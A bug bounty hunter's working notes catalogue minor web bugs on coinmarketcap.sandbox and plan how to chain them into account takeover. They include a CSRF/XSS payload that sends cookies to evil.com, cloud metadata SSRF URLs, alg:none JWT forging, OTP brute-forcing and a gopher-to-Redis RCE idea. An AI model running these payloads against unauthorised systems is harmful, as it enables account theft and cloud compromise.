# Chain Primitives Registry

Central registry of all discovered chain primitives — bugs that are N/A alone but
become valid when combined with another primitive. This is your chain construction
workshop: track what you have, what you need, and how to put them together.

---

## Table of Contents

1. [Chain Building Methodology](#1-chain-building-methodology)
2. [Primitive Inventory](#2-primitive-inventory)
3. [Primitive Partner Matrix](#3-primitive-partner-matrix)
4. [Chain Construction Templates](#4-chain-construction-templates)
5. [High-Priority Chains](#5-high-priority-chains)
6. [Active Chain Investigations](#6-active-chain-investigations)
7. [Completed Chains](#7-completed-chains)
8. [Chain Failure Log](#8-chain-failure-log)
9. [Chain Idea Incubator](#9-chain-idea-incubator)
10. [External Chain Examples (Disclosed Reports)](#10-external-chain-examples-disclosed-reports)
11. [Chain Payout Estimation](#11-chain-payout-estimation)
12. [Primitive Dependency Graph](#12-primitive-dependency-graph)
13. [Chain Testing Methodology](#13-chain-testing-methodology)
14. [Cross-Target Primitive Transfers](#14-cross-target-primitive-transfers)
15. [Chain Quick Reference](#15-chain-quick-reference)

---

## 1. Chain Building Methodology

### What Is a Chain Primitive?

A **chain primitive** is a finding that is not independently submittable but can be
combined with other primitives to create a valid, high-impact finding. Examples:
- Open redirect alone -> N/A (always rejected)
- Open redirect + OAuth redirect_uri bypass -> OAuth token theft -> ATO -> High/Critical

### Chain Types

| Type | Description | Example |
|------|-------------|---------|
| **A -> B** | Primitive A enables primitive B | Open redirect -> OAuth token theft |
| **A + B** | Both primitives needed together | Self-XSS + CSRF = Stored XSS |
| **A enables B discovery** | Using A to find B | JWT alg:none -> admin panel access -> Stored XSS in admin |
| **A amplifies B** | A makes B more severe | Missing CSP + Stored XSS = no CSP to block script exfil |

### Chain Value Calculation

```
Chain Value = Impact - (Effort to chain + Probability of failure)

Where:
- Impact: The severity of the chained finding (CVSS 4.0)
- Effort: Time needed to find the missing primitive and construct the chain
- Probability of failure: How likely the chain is to work (depends on architecture)

A chain is worth pursuing if:
  Chain Value > Value of finding a standalone bug in the same time
```

### Chain Construction Process

```
Step 1: Primitive Discovery
  - Find a bug that is N/A alone but N/A-able
  - Log it in the Primitive Inventory
  - Tag it with potential chain partners

Step 2: Partner Identification
  - What other primitive would make this valid?
  - Research: does this target have the required partner primitive?
  - Common partners: CSRF, OAuth, XSS, SSRF, open redirect

Step 3: Chain Design
  - Design the chain: primitive A -> primitive B -> impact
  - Estimate severity and payout
  - Assess probability of success

Step 4: Partner Hunting
  - Actively hunt for the missing primitive
  - Use the hunting methodology on related endpoints
  - Time-box: 1-2 sessions to find the partner

Step 5: Chain Construction
  - Craft the end-to-end exploit
  - Test each step independently
  - Test the full chain

Step 6: Chain Validation
  - Reproduce the full chain 3x
  - Document each step with evidence
  - Run the 7-Question Gate on the chain (not the individual primitives)

Step 7: Reporting
  - Report the chain as a single finding
  - Explain both primitives and how they connect
  - The chain impact is what matters, not the individual pieces
```

### When to Chain vs When to Submit Standalone

| Scenario | Decision |
|----------|----------|
| Found a High/Critical standalone bug | Submit it immediately. Do not wait to chain. |
| Found a primitive that chains to Medium | Chain it if partner is likely; kill if not |
| Found a primitive that chains to Critical | Invest time hunting the partner |
| Two primitives discovered in the same session | If they chain, combine in one report |
| Primitive discovered on different targets | Usually can't chain across targets |

---

## 2. Primitive Inventory

### 2.1 Active Primitives

Primitives that are confirmed to exist and waiting for a chain partner:

| # | Primitive | Bug Class | Target | Endpoint | Discovered | Chain Partner Needed | Priority |
|---|-----------|-----------|--------|----------|------------|---------------------|----------|
| 1 | Open Redirect | Open Redirect | coinmarketcap.sandbox | /api/v3/partner/routing | 2026-06-05 | OAuth redirect_uri bypass | Medium |
| 2 | Missing CSP | Info Disc | coinmarketcap.sandbox | All | 2026-06-05 | Stored XSS | Low |
| 3 | Self-XSS candidate | Self-XSS | coinmarketcap.sandbox | /api/v2/users/{id}/profile (bio) | 2026-06-05 | CSRF on profile update | Low |
| 4 | JWT alg:none | JWT | coinmarketcap.sandbox | All authenticated endpoints | 2026-06-05 | Admin panel stored XSS | High |
| 5 | Registration disabled | Auth | boozt.com | /api/register | 2026-06-05 | Test credentials OR invite abuse | Medium |

### 2.2 Primitive Details

#### Primitive 1: Open Redirect on Partner Routing

```
PRIMITIVE: Open Redirect
BUG CLASS: Open Redirect
TARGET: coinmarketcap.sandbox
ENDPOINT: GET /api/v3/partner/routing?url={attacker_url}
STATUS: Confirmed — chain partner needed
PRIORITY: Medium

DETAILS:
The endpoint /api/v3/partner/routing accepts a "url" parameter
and redirects the browser to that URL. No validation of the
redirect target was observed.

TEST:
GET /api/v3/partner/routing?url=https://evil.com
Response: 302 Redirect to https://evil.com

ALONE: N/A (Always-Rejected List item #4)
TO CHAIN: Requires OAuth authorization endpoint with redirect_uri validation bypass
CHAIN: Open Redirect -> OAuth redirect_uri = {target}/routing?url={attacker} -> Auth code theft

CHAIN SEVERITY ESTIMATE: Critical (CVSS 4.0: 9.1)
  - OAuth token theft -> account takeover
  - Affects all users who authenticate via OAuth
```

#### Primitive 2: Missing CSP Headers

```
PRIMITIVE: Missing CSP Headers
BUG CLASS: Information Disclosure / Security Misconfiguration
TARGET: coinmarketcap.sandbox
ENDPOINT: All HTTP responses
STATUS: Confirmed — chain partner needed
PRIORITY: Low

DETAILS:
No Content-Security-Policy header is set on any response.
This means any XSS vulnerability can exfiltrate data without
CSP restrictions (no script-src, no connect-src restrictions).

ALONE: N/A (Always-Rejected List item #1)
TO CHAIN: Requires a stored or reflected XSS vulnerability
CHAIN: Stored XSS -> no CSP -> unrestricted cookie/data exfiltration

CHAIN SEVERITY ESTIMATE: Depends on XSS finding
  - With stored XSS hitting admin: Critical (CVSS: 9.1)
  - With reflected XSS: High (CVSS: 7.2)
  - CSP alone: N/A. CSP + XSS: evidence of full impact.
```

#### Primitive 3: Self-XSS in Profile Bio

```
PRIMITIVE: Self-XSS in Profile Bio
BUG CLASS: Self-XSS
TARGET: coinmarketcap.sandbox
ENDPOINT: PUT /api/v2/users/{id}/profile (bio field)
STATUS: Not tested — hypothesized from feature analysis
PRIORITY: Low

DETAILS:
The profile bio field may accept HTML/JavaScript input. If the bio
renders on the profile page, but ONLY the profile owner views it,
it is self-XSS.

ALONE: N/A (Always-Rejected List item #3)
TO CHAIN: Requires CSRF on the profile update endpoint
  OR: Requires the bio to render on other users' pages (then it's stored XSS, not self-XSS)
CHAIN A: Self-XSS + CSRF -> XSS executes on victim when CSRF triggers profile update
CHAIN B: If bio renders on public profile -> it's stored XSS, submit standalone

TEST:
1. Update bio with <script>alert(document.cookie)</script>
2. Check if script executes on own profile
3. Check if script executes when another user views the profile
4. If only self: check CSRF protection on PUT /api/v2/users/{id}/profile
```

#### Primitive 4: JWT alg:none

```
PRIMITIVE: JWT Signature Bypass (alg:none)
BUG CLASS: JWT Attack
TARGET: coinmarketcap.sandbox
ENDPOINT: All authenticated endpoints (via Authorization header)
STATUS: Confirmed — can already use standalone (submitting as High)
PRIORITY: High

DETAILS:
JWT tokens with alg: none are accepted. This allows forging
arbitrary tokens with any payload.

STANDALONE SEVERITY: High (CVSS 4.0: 8.1)
  - Bypass paywall, access all authenticated endpoints
  - Modify JWT payload to escalate plan/role

CHAIN POTENTIAL:
  - If admin role in JWT grants admin access -> can be Critical
  - If admin panel has stored XSS -> chain to admin session takeover
  - If admin panel has data export -> full data breach

CHAIN INVESTIGATION STATUS:
  - JWT with role:admin -> test /api/admin/dashboard: [Not tested with admin JWT]
  - Admin endpoint enumeration: [Not started]
  - Stored XSS in admin panel: [Not tested]
```

---

## 3. Primitive Partner Matrix

### 3.1 What Primitives Chain Together

| Primitive A | Needs Primitive B | Chain Result | CVSS |
|-------------|------------------|--------------|------|
| Open Redirect | OAuth redirect_uri bypass | OAuth token theft -> ATO | 9.1 |
| Open Redirect | SSRF (blind) | Redirect to internal -> SSRF with data | 7.5 |
| Self-XSS | CSRF | Stored XSS via CSRF -> cookie theft | 7.5 |
| Missing CSP | Any XSS | Unrestricted data exfiltration | +0.8 to XSS CVSS |
| Missing HSTS | MITM position | Cookie theft over HTTP | 5.9 |
| Missing XFO | Clickjacking | One-click sensitive action | 6.5 |
| Username Enumeration | Password spray (no rate limit) | Account takeover | 9.3 |
| Username Enumeration | Credential stuffing | Account takeover | 8.6 |
| Rate Limit Bypass | OTP brute-force | MFA bypass | 7.5 |
| Rate Limit Bypass | Password brute-force | Account takeover | 9.3 |
| Host Header Injection | Password reset flow | Reset token to attacker | 8.3 |
| Logout CSRF | Session fixation | Pre-session takeover | 4.3 |
| No HttpOnly | Stored XSS | Cookie theft (would be blocked by HttpOnly) | +0.5 to XSS |
| JWT alg:none | Admin panel stored XSS | Full admin session takeover | 9.1 |
| JWT alg:none | IDOR write (via API) | Mass user data modification | 9.3 |
| SSRF (blind) | Internal service discovery | Data access/SSRF exploitation | 7.5 |
| SSRF (blind) | Cloud metadata access | IAM credentials -> full cloud access | 10.0 |
| File Upload | Path traversal in filename | Local file overwrite -> RCE | 8.5 |
| IDOR (read) | IDOR (write on same resource) | Full account takeover | 9.1 |

### 3.2 Primitive Dependency Map

```
Open Redirect
  └─ needs OAuth redirect_uri bypass
  └─ needs SSRF partner for internal redirect

Self-XSS
  └─ needs CSRF (no token on update endpoint)
  └─ OR: if public profile -> becomes stored XSS (chain not needed)

Missing CSP
  └─ needs any XSS

Missing HSTS
  └─ needs MITM position (rarely feasible)

Missing XFO
  └─ needs CSRF or clickjackable action

Username Enumeration
  └─ needs password spray (no rate limit)
  └─ needs credential stuffing

Rate Limit Bypass
  └─ needs OTP brute-force target
  └─ needs password brute-force target

Host Header Injection
  └─ needs password reset flow that uses Host header

JWT alg:none
  └─ already standalone (High)
  └─ chain to Critical via admin stored XSS

SSRF (DNS callback only)
  └─ needs cloud metadata to work
  └─ needs internal service on known port

IDOR (read)
  └─ needs IDOR (write on same resource) for ATO
```

---

## 4. Chain Construction Templates

### 4.1 Template: IDOR -> Auth Bypass -> ATO

```
CHAIN: IDOR (email change) -> ATO

PRIMITIVES:
  A: IDOR on PUT /api/users/{id}/email — can change any user's email
  B: Auth does not require re-authentication for email change

STEPS:
  1. As attacker, send PUT /api/users/{victim_id}/email
     Body: {"email": "attacker@evil.com"}
  2. Server changes victim's email without verifying current password
  3. Attacker uses password reset on victim's new email
  4. Attacker resets password and takes over victim's account

DIFFICULTY: Easy (10 min)
SEVERITY: Critical (CVSS 4.0: 9.3)
NOTES: Look for endpoints that accept email/user ID parameter with write access
```

### 4.2 Template: Open Redirect -> OAuth Token Theft -> ATO

```
CHAIN: Open Redirect + OAuth redirect_uri bypass -> ATO

PRIMITIVES:
  A: Open redirect on domain target.com (e.g., /redirect?url=)
  B: OAuth authorization endpoint that validates redirect_uri against
     allowed domains but not paths

STEPS:
  1. Craft OAuth authorization URL:
     https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/redirect?url=https://attacker.com
  2. OAuth server validates redirect_uri hostname = target.com (passes)
  3. User authorizes the app
  4. Auth code sent to: https://target.com/redirect?url=https://attacker.com?code=AUTH_CODE
  5. Open redirect forwards to: https://attacker.com?code=AUTH_CODE
  6. Attacker captures auth code, exchanges for access token
  7. Attacker takes over user's account

DIFFICULTY: Medium (30 min if both primitives exist)
SEVERITY: Critical (CVSS 4.0: 9.1)
REAL EXAMPLE: $3,500 payout on HackerOne (Doordash open redirect + OAuth chain)
```

### 4.3 Template: Self-XSS + CSRF -> Stored XSS

```
CHAIN: Self-XSS + CSRF -> Stored XSS hitting victim

PRIMITIVES:
  A: Self-XSS in profile bio (XSS fires only when owner views their own profile)
  B: CSRF on profile update endpoint (no CSRF token or weak validation)

STEPS:
  1. Attacker crafts CSRF PoC HTML page:
     <form action="https://target.com/api/profile/update" method="POST">
       <input name="bio" value='<script>fetch("https://evil.com/?c="+document.cookie)</script>'>
     </form>
     <script>document.forms[0].submit();</script>
  2. Victim visits attacker's page (via phishing, link, etc.)
  3. CSRF triggers: victim's profile bio updated to XSS payload
  4. Victim navigates to their own profile (or is redirected there)
  5. XSS executes in victim's browser, cookies sent to attacker

DIFFICULTY: Medium (45 min if both primitives exist)
SEVERITY: High (CVSS 4.0: 7.5) or Critical if admin victim (CVSS 9.1)
```

### 4.4 Template: SSRF -> Cloud Metadata -> Cloud Compromise

```
CHAIN: SSRF (blind) -> Cloud metadata discovery -> IAM credential theft -> Cloud account access

PRIMITIVES:
  A: SSRF on an endpoint that fetches external URLs (confirmed via DNS callback)
  B: Target is hosted on a cloud provider (AWS/GCP/Azure) with metadata service

STEPS:
  1. Confirm SSRF: callback received from own server
  2. Test cloud metadata endpoints:
     AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
     GCP: http://metadata.google.internal/computeMetadata/v1/
     Azure: http://169.254.169.254/metadata/instance
  3. If metadata returns IAM credentials:
     - Extract AccessKeyId, SecretAccessKey, Token
     - Configure AWS CLI with stolen credentials
     - Enumerate IAM privileges
     - Escalate to full cloud compromise

DIFFICULTY: Medium (20 min if metadata accessible)
SEVERITY: Critical (CVSS 4.0: 10.0)
REAL EXAMPLE: $5,000 payout for SSRF -> AWS metadata -> cloud access
```

### 4.5 Template: Host Header Injection -> Password Reset -> ATO

```
CHAIN: Host header injection in password reset -> Reset token to attacker -> ATO

PRIMITIVES:
  A: Password reset endpoint uses Host header to construct reset link
  B: No validation of the Host header on the reset endpoint

STEPS:
  1. Craft password reset request with modified Host header:
     POST /api/password/reset HTTP/1.1
     Host: attacker-controlled.com
     {"email": "victim@target.com"}
  2. Server sends email to victim with reset link:
     https://attacker-controlled.com/reset?token=XYZ
  3. Attacker either:
     a) Receives the email if they control the domain (DNS + MX)
     b) Observes the DNS query for their domain
     c) The token is predictable (short, numeric, timestamp-based)

DIFFICULTY: Medium (30 min for setup)
SEVERITY: Critical (CVSS 4.0: 9.3)
COMMON IN: Applications that dynamically construct URLs from Host header
```

### 4.6 Template: Rate Limit Bypass -> OTP Brute-Force -> MFA Bypass

```
CHAIN: Rate limit bypass + OTP brute-force -> MFA bypass

PRIMITIVES:
  A: Rate limit bypass on OTP validation endpoint (X-Forwarded-For, batch, etc.)
  B: OTP is short (4-6 digits) with no account lockout

STEPS:
  1. Identify OTP validation endpoint (POST /api/2fa/verify)
  2. Test if rate limiting exists (try 10+ invalid OTPs)
  3. If no rate limit or bypassable:
     - Send 10,000 requests for 4-digit OTP (takes ~30 seconds)
     - OR send 1,000,000 requests for 6-digit OTP (takes ~30 minutes)
  4. When OTP is guessed correctly -> MFA bypassed
  5. Account takeover complete

DIFFICULTY: Medium (20 min for testing, 30 min for brute-force)
SEVERITY: High (CVSS 4.0: 8.3)
```

---

## 5. High-Priority Chains

### 5.1 Chain 1: JWT alg:none + Admin Stored XSS

```
CHAIN: JWT alg:none -> Admin Panel Access -> Stored XSS -> Full Admin Session Takeover

STATUS: Investigation in progress
PRIMITIVE USED: JWT alg:none (confirmed) + Stored XSS in admin panel (not yet found)
TARGET: coinmarketcap.sandbox
PRIORITY: High

CURRENT PROGRESS:
  [x] JWT alg:none confirmed
  [ ] JWT with role:admin grants admin access
  [ ] Admin endpoint enumeration
  [ ] Stored XSS in admin panel
  [ ] Full chain tested and validated

EXPECTED SEVERITY: Critical (CVSS 4.0: 9.1)
EXPECTED PAYOUT: $3,000-$6,000

NEXT STEPS:
  1. Create JWT with alg:none and payload: {"role": "admin", "sub": "test"}
  2. Test access to /api/admin/dashboard and other admin endpoints
  3. If admin access works, hunt for stored XSS vectors in admin panel
     (user management, settings, content management, etc.)
  4. If stored XSS found, chain: admin JWT -> access admin -> stored XSS -> cookie theft
```

### 5.2 Chain 2: Open Redirect + OAuth redirect_uri

```
CHAIN: Open Redirect + OAuth redirect_uri bypass -> OAuth Token Theft -> ATO

STATUS: Pending — OAuth endpoint not fully implemented in sandbox
PRIMITIVE USED: Open redirect (confirmed) + OAuth (needs verification)
TARGET: coinmarketcap.sandbox (or production)
PRIORITY: Medium

CURRENT PROGRESS:
  [x] Open redirect confirmed on /api/v3/partner/routing
  [ ] OAuth authorization endpoint identified
  [ ] redirect_uri validation tested
  [ ] Chain tested on production

BLOCKER: The sandbox has OAuth providers configured (Google, Apple, Facebook)
  but the OAuth flow may not be fully implemented on sandbox.
  Check production coinmarketcap.com for live OAuth flow.

NEXT STEPS:
  1. Check if production OAuth flow exists
  2. Test redirect_uri: https://production.com/partner/routing?url=https://evil.com
  3. If redirect_uri allows paths -> open redirect chain works
  4. Full OAuth token theft demonstrated
```

### 5.3 Chain 3: SSRF + Cloud Metadata

```
CHAIN: SSRF -> Cloud Metadata -> IAM Credentials -> Cloud Compromise

STATUS: Testing in progress
PRIMITIVE USED: SSRF confirmed (DNS callback)
TARGET: coinmarketcap.sandbox
PRIORITY: High

CURRENT PROGRESS:
  [x] SSRF confirmed via DNS callback to Burp Collaborator
  [ ] Cloud provider identified (AWS/GCP/Azure?)
  [ ] Metadata endpoint tested
  [ ] If blocked: bypass attempts made
  [ ] IAM credentials extracted (if accessible)

NEXT STEPS:
  1. Determine cloud provider (check hosting headers, IP range)
  2. Test AWS: http://169.254.169.254/latest/meta-data/
  3. Test GCP: http://metadata.google.internal/ (with Metadata-Flavor: Google)
  4. Test Azure: http://169.254.169.254/metadata/instance (with Metadata: true)
  5. If blocked, try bypass: http://0x7f.0x0.0x0.0x1/ (hex for 127.0.0.1) with different ports
```

---

## 6. Active Chain Investigations

### 6.1 Investigation Log

| # | Chain | Primitive A | Primitive B | Status | Started | Effort So Far |
|---|-------|-------------|-------------|--------|---------|---------------|
| 1 | JWT -> Admin -> XSS | JWT alg:none | Admin stored XSS | Hunting for B | 2026-06-06 | 0h |
| 2 | OR -> OAuth -> ATO | Open redirect | OAuth redirect_uri | Waiting on target | 2026-06-05 | 0.5h |
| 3 | SSRF -> Cloud -> AWS | SSRF callback | Cloud metadata | Testing | 2026-06-06 | 0h |

### 6.2 Investigation: JWT -> Admin -> Stored XSS

```
CHAIN INVESTIGATION: JWT alg:none -> Admin Access -> Stored XSS

CURRENT HYPOTHESIS:
  JWT alg:none allows forging tokens with any payload. If we set
  role: admin in the JWT, the server may grant admin-level access
  to endpoints. Admin panels often have stored XSS vectors (user
  management, content editing, settings). Combining these gives
  full admin account takeover.

TEST PLAN:

Step 1: Verify JWT alg:none admin access
  - Create JWT: header={"alg":"none"}, payload={"role":"admin","sub":"1"}
  - Send to GET /api/admin/dashboard
  - Expected: 200 OK with admin content
  - If 401/403: try different payload fields (isAdmin, permissions, etc.)
  - If still blocked: JWT role field is not sufficient for admin

Step 2: Enumerate admin endpoints
  - Use the admin JWT to access all known admin endpoints
  - Fuzz for undiscovered admin endpoints
  - Document what each admin endpoint does

Step 3: Find stored XSS in admin panel
  - Test every admin feature that accepts user input
  - User management: display name, notes, email
  - Content management: article body, title, metadata
  - Settings: site name, support email, custom scripts
  - Test each input with: <script>alert(1)</script>

Step 4: Construct the chain
  - Forge admin JWT
  - Inject XSS payload via admin feature
  - When another admin views the affected page, XSS executes
  - Steal the admin's session cookie

SUCCESS CRITERIA:
  - Admin JWT grants admin access (Step 1)
  - At least one stored XSS vector in admin panel (Step 3)
  - Full chain demonstrates admin-to-admin cookie theft (Step 4)

TIME ESTIMATE: 1-2 hours
SUCCESS PROBABILITY: 40% (depends on admin role mapping)
```

### 6.3 Investigation: Open Redirect -> OAuth -> ATO

```
CHAIN INVESTIGATION: Open Redirect + OAuth -> ATO

CURRENT HYPOTHESIS:
  The sandbox has OAuth providers configured (Google, Apple, Facebook)
  but may not have a complete OAuth flow. However, the production
  coinmarketcap.com likely has a working OAuth flow. If the same
  open redirect exists on production, the chain may work.

TEST PLAN:

Step 1: Identify OAuth endpoints
  - Check production coinmarketcap.com for OAuth flows
  - Look for: /auth/google, /auth/facebook, /auth/apple
  - Look for: redirect_uri parameter in OAuth authorization requests

Step 2: Test redirect_uri validation
  - Start an OAuth authorization request
  - Modify redirect_uri to: https://coinmarketcap.com/partner/routing?url=https://evil.com
  - Check if redirect_uri is accepted (depends on validation logic)

Step 3: Full chain demonstration (if Step 2 passes)
  - Craft OAuth URL with modified redirect_uri
  - User authorizes -> auth code sent to open redirect
  - Open redirect forwards to attacker with auth code
  - Exchange auth code for access token
  - Account takeover

SUCCESS CRITERIA:
  - OAuth flow exists on production (Step 1)
  - redirect_uri accepts the open redirect path (Step 2)
  - Full chain works end-to-end (Step 3)

TIME ESTIMATE: 1-2 hours (if production has OAuth)
SUCCESS PROBABILITY: 30% (open redirect may not be on production)
```

---

## 7. Completed Chains

Chains that have been fully validated and submitted (or would have been):

| # | Chain | Target | Findings Used | Severity | Status | Date |
|---|-------|--------|---------------|----------|--------|------|
| — | — | — | — | — | — | — |

---

## 8. Chain Failure Log

Chains that were attempted but failed:

```
# | Date | Chain Attempt | Primitive A | Primitive B | Failure Reason | Time Spent |
---|------|---------------|-------------|-------------|----------------|-------------|
1 | 2026-06-05 | OR + OAuth | Open redirect | OAuth endpoint | OAuth flow not fully implemented in sandbox | 30 min |

### Failure: Open Redirect + OAuth — OAuth Flow Not Available

Chain: Open redirect + OAuth redirect_uri bypass -> OAuth token theft

What Was Tried:
1. Found open redirect on /api/v3/partner/routing
2. Found OAuth provider list at /api/v3/auth/providers (Google, Apple, Facebook)
3. Tried to initiate OAuth flow: GET /api/v3/auth/google/url
4. Result: 404 Not Found — OAuth authorization endpoint does not exist in sandbox

Why It Failed:
- The sandbox environment has OAuth providers configured in settings
  but the actual OAuth authorization endpoints are not implemented
- The open redirect exists and works, but there's no OAuth flow to chain it with

What Would Make It Work:
- Production coinmarketcap.com likely has a working OAuth flow
- If production also has the open redirect (or a similar one), the chain would work
- Need to verify: does production have the same routing endpoint?

Lesson:
- Sandbox environments often have incomplete feature implementations
- OAuth configuration (provider list) does not mean OAuth flow is functional
- Chain opportunities may exist on production but not sandbox
- When a chain fails due to environment limitations, document for production testing
```

---

## 9. Chain Idea Incubator

### 9.1 New Chain Ideas

Ideas that haven't been investigated yet:

| # | Idea | Primitives Needed | Targets That Have A | Potential B | Expected Severity | Priority |
|---|------|-------------------|-------------------|-------------|-------------------|----------|
| 1 | IDOR write -> ATO | IDOR on email change | Any with IDOR write | No re-auth on email change | Critical | High |
| 2 | Mass assignment -> Admin | role field in registration | Any with mass assign | Admin role actually works | Critical | High |
| 3 | SSRF -> Redis -> RCE | SSRF with gopher:// | Any with SSRF | Redis on 6379 internally | Critical | Medium |
| 4 | JWT weak secret -> Forge all users | Weak HMAC secret | Any with JWT | rockyou brute-force | Critical | Medium |
| 5 | SQLi + IDOR -> Full DB | SQLi in one endpoint | Any with SQLi | Can query any table | Critical | Medium |
| 6 | No rate limit + spray -> ATO | Rate limit bypass | Any with login | Credential stuffing | Critical | Medium |
| 7 | GraphQL intro + IDOR -> All data | GraphQL introspection | Any with GraphQL | Query any user | Critical | High |
| 8 | CRLF + cache -> Cache poison | CRLF injection | Any with CRLF | CDN caching | High | Low |

### 9.2 Idea Incubator Details

#### Idea 2: Mass Assignment -> Admin
```
IDEA: Mass assignment 'role' field in registration creates admin account

PRIMITIVES NEEDED:
  A: Registration endpoint accepts 'role' or similar field
  B: Server-side code maps the role to actual admin privileges

TARGET CANDIDATES: coinmarketcap.sandbox — registration accepts 'role' field
EFFORT: 15 minutes to test
EXPECTED SEVERITY: Critical (CVSS 9.3+)

TEST STEPS:
1. POST /api/register with extra fields: {"email":"admin@test.com","password":"test","role":"admin","is_admin":true}
2. Log in with the created account
3. Test if account has elevated privileges (access to admin endpoints)
4. If yes -> Critical mass assignment finding
```

#### Idea 3: SSRF -> Redis -> RCE
```
IDEA: Use SSRF with gopher:// protocol to interact with internal Redis

PRIMITIVES NEEDED:
  A: SSRF with protocol flexibility (can use gopher://)
  B: Internal Redis server on port 6379

EFFORT: 30 minutes to test
EXPECTED SEVERITY: Critical (CVSS 9.0+)

TEST STEPS:
1. Confirm SSRF works (done)
2. Test if gopher:// protocol is supported: url=gopher://127.0.0.1:6379/_PING
3. If gopher works, craft Redis commands to write SSH key or add cron job
4. If Redis is writable -> RCE on internal server
```

---

## 10. External Chain Examples (Disclosed Reports)

### 10.1 Real Chain Examples That Paid

Study these chains to understand what works:

#### Example 1: Doordash — Open Redirect + OAuth -> ATO ($3,500)
```
Source: HackerOne disclosed report
Chain: Open redirect on accounts.ddoordash.com + OAuth redirect_uri bypass
        -> Google OAuth code theft -> Account takeover
Severity: Critical (9.1)
Payout: $3,500
Year: 2023
Key Insight: Open redirect was on the same domain as the OAuth callback URL,
  so redirect_uri validation passed (same hostname), but the path redirected
  to attacker.com with the auth code in the URL.
```

#### Example 2: Uber — SSRF + Cloud Metadata -> AWS Access ($10,000)
```
Source: HackerOne disclosed report
Chain: SSRF via image resize service -> AWS EC2 metadata endpoint
        -> IAM credentials for production role -> Full AWS access
Severity: Critical (10.0)
Payout: $10,000
Year: 2022
Key Insight: The image resize service fetched URLs without IP restriction.
  The metadata endpoint returned IAM credentials for a production role
  that had broad S3 and EC2 access.
```

#### Example 3: Twitter — IDOR + No Auth on Admin -> Full User Data
```
Source: HackerOne disclosed report
Chain: IDOR in user lookup API + No auth check on admin endpoints
        -> Access any user's private data (email, phone, DMs)
Severity: Critical (9.3)
Payout: $7,000
Year: 2022
Key Insight: The admin API endpoint existed but wasn't publicly documented.
  The IDOR was discovered via API fuzzing and the auth bypass was a
  missing middleware check on the admin route handler.
```

#### Example 4: Shopify — Mass Assignment + Admin Escalation ($5,000)
```
Source: HackerOne disclosed report
Chain: Mass assignment in partner API -> Set role=admin on account
        -> Full admin access to Shopify store -> Access all customer data
Severity: Critical (9.3)
Payout: $5,000
Year: 2023
Key Insight: The API accepted a `role` parameter in the account update
  endpoint. The developer assumed only admins would call this endpoint,
  but authentication was not properly scoped.
```

#### Example 5: GitLab — SSRF + Internal Service -> Admin Token Theft
```
Source: HackerOne disclosed report
Chain: SSRF via project import -> Internal Prometheus service
        -> Extract admin API token from Prometheus config -> Full admin access
Severity: Critical (9.9)
Payout: $15,000
Year: 2021
Key Insight: The SSRF could reach internal monitoring services that had
  configuration files containing admin tokens. Multiple service hops
  in the chain.
```

### 10.2 External Chain Pattern Analysis

| Pattern | Frequency | Avg Payout | Difficulty | Time to Build |
|---------|-----------|------------|------------|---------------|
| SSRF -> Internal Service -> Credentials | High | $7,000 | Medium | 1-2 hours |
| Open Redirect -> OAuth -> ATO | Medium | $3,500 | Medium | 1-2 hours |
| IDOR -> IDOR write -> ATO | High | $4,000 | Easy | 30 min |
| Mass Assignment -> Admin | Medium | $5,000 | Easy | 15 min |
| XSS + CSRF -> Stored XSS | Low | $3,000 | Hard | 2-3 hours |
| SSRF -> Cloud Metadata -> AWS | Medium | $8,000 | Medium | 1 hour |
| Rate Limit + Brute-force -> OTP bypass | Medium | $3,000 | Medium | 1 hour |
| Host Header + Password Reset -> ATO | High | $4,000 | Easy | 30 min |

---

## 11. Chain Payout Estimation

### 11.1 Estimated Payout by Chain Type

| Chain | Min Payout | Median Payout | Max Payout | Effort (hours) | Effective Hourly |
|-------|-----------|---------------|-----------|----------------|------------------|
| JWT -> Admin -> XSS -> ATO | $2,000 | $4,000 | $8,000 | 2 | $2,000/h |
| OR -> OAuth -> ATO | $2,000 | $3,500 | $6,000 | 2 | $1,750/h |
| SSRF -> Cloud -> AWS Compromise | $5,000 | $8,000 | $15,000 | 1 | $8,000/h |
| IDOR -> IDOR write -> ATO | $2,000 | $4,000 | $7,000 | 0.5 | $8,000/h |
| Mass Assignment -> Admin | $3,000 | $5,000 | $10,000 | 0.25 | $20,000/h |
| Host Header -> Password Reset -> ATO | $2,000 | $4,000 | $7,000 | 0.5 | $8,000/h |
| SSRF -> Redis -> RCE | $5,000 | $8,000 | $20,000 | 2 | $4,000/h |
| Rate Limit + OTP -> MFA bypass | $1,000 | $3,000 | $5,000 | 1 | $3,000/h |

### 11.2 Chain Value Calculation

```
CHAIN: SSRF -> Cloud Metadata -> AWS Compromise
Value = $8,000 - (1 hour × $500 opportunity cost)
Value = $7,500

CHAIN: JWT -> Admin -> XSS -> ATO
Value = $4,000 - (2 hours × $500 opportunity cost)
Value = $3,000

CHAIN: Mass Assignment -> Admin
Value = $5,000 - (0.25 hours × $500)
Value = $4,875 (highest value per hour!)
```

---

## 12. Primitive Dependency Graph

### 12.1 Visual Dependency Map

```
                    ┌──────────────────────────┐
                    │     JWT alg:none          │
                    │  (coinmarketcap sandbox)  │
                    └────────────┬─────────────┘
                                 │
                                 ▼
                    ┌──────────────────────────┐
                    │  Admin Panel Access       │
                    │  (if role mapping works)  │
                    └────────────┬─────────────┘
                                 │
                    ┌────────────┴─────────────┐
                    │                          │
                    ▼                          ▼
        ┌───────────────────┐      ┌───────────────────┐
        │ Stored XSS         │      │ IDOR Write / Data  │
        │ in admin panel     │      │ Export in admin    │
        │ -> admin ATO       │      │ -> full data loss  │
        └───────────────────┘      └───────────────────┘

                    ┌──────────────────────────┐
                    │     Open Redirect         │
                    │  (coinmarketcap sandbox)  │
                    └────────────┬─────────────┘
                                 │
                    ┌────────────┴─────────────┐
                    │                          │
                    ▼                          ▼
        ┌───────────────────┐      ┌───────────────────┐
        │ OAuth redirect_uri│      │ SSRF redirect      │
        │ bypass -> ATO     │      │ -> internal access  │
        └───────────────────┘      └───────────────────┘

                    ┌──────────────────────────┐
                    │     SSRF (DNS callback)   │
                    │  (coinmarketcap sandbox)  │
                    └────────────┬─────────────┘
                                 │
                    ┌────────────┴─────────────┐
                    │                          │
                    ▼                          ▼
        ┌───────────────────┐      ┌───────────────────┐
        │ Cloud Metadata    │      │ Internal Service   │
        │ -> IAM creds      │      │ Discovery -> data  │
        └───────────────────┘      └───────────────────┘
```

### 12.2 Primitive Inventory by Target

```
COINMARKETCAP.SANDBOX:
  Primitives Available:
    - P1: JWT alg:none (High — standalone)
